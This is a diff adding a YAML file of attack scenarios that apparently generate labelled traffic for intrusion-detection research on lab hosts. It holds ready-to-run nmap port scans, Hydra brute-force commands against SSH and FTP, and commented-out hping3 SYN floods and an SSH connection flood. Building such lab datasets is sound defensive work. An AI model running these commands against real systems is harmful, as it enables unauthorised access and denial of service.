@@ -1,0 +1,62 @@
+ssh:
+  - name: "PortScan - TCP SYN scan on SSH"
+    destination: "ssh"
+    category: "PortScan"
+    intensity: "low"
+    # command: "nmap -sS -p 22 ssh-lab"
+    command: "nmap -sS -p 1-1000 ssh-lab"
+
+  - name: "PortScan - full TCP connect scan"
+    destination: "ssh"
+    category: "PortScan"
+    intensity: "medium"
+    command: "nmap -sT -p 1-1000 ssh-lab"
+
+  - name: "SSH brute-force with Hydra"
+    destination: "ssh"
+    category: "SSH-Patator"
+    intensity: "high"
+    command: "hydra -t 4 -L /wordlists/usernames.txt -P /wordlists/passwords.txt 172.18.0.4 -s 22 ssh"
+
+  # - name: "DoS - SYN flood using hping3"
+  #   destination: "ssh"
+  #   category: "DoS"
+  #   intensity: "high"
+  #   command: "timeout 10s hping3 -S -p 22 --flood ssh-lab"
+
+  # - name: "DoS - mass SSH connection attempts"
+  #   destination: "ssh"
+  #   category: "DoS"
+  #   intensity: "medium"
+  #   command: "for i in {1..500}; do timeout 1s ssh -oBatchMode=yes testuser@ssh-lab -p 22; done"
+
+ftp:
+  - name: "FTP brute-force - multiple passwords for single user"
+    destination: "ftp"
+    category: "FTP-Patator"
+    intensity: "medium"
+    command: "hydra -t 4 -l testuser -P /wordlists/passwords.txt 172.18.0.4 -s 21 ftp"
+
+  - name: "FTP brute-force - multiple usernames and passwords"
+    destination: "ftp"
+    category: "FTP-Patator"
+    intensity: "high"
+    command: "hydra -t 4 -L /wordlists/usernames.txt -P /wordlists/passwords.txt -s 21 172.18.0.4 ftp -vV"
+
+  - name: "PortScan - TCP SYN scan on FTP port"
+    destination: "ftp"
+    category: "PortScan"
+    intensity: "low"
+    command: "nmap -sS -p 21 ftp-lab"
+
+  - name: "PortScan - full TCP connect scan on common FTP ports"
+    destination: "ftp"
+    category: "PortScan"
+    intensity: "medium"
+    command: "nmap -sT -p 20-21 ftp-lab"
+
+  # - name: "DoS - SYN flood on FTP port"
+  #   destination: "ftp"
+  #   category: "DoS"
+  #   intensity: "high"
+  #   command: "timeout 10s hping3 -S -p 21 --flood ftp-lab"
